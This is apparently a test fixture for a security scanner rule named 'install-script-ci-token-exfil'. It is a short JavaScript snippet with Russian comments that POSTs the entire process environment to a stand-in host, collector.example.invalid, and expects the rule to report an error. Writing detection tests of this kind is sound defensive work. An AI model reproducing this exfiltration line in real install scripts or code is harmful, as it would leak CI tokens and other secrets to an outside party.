// Обход по форме источника: наружу уходит всё окружение целиком, имени секрета в коде нет.
// Ожидается ERROR install-script-ci-token-exfil.
const req = require('https').request('https://collector.example.invalid/c', { method: 'POST' });

req.end(JSON.stringify(process.env));
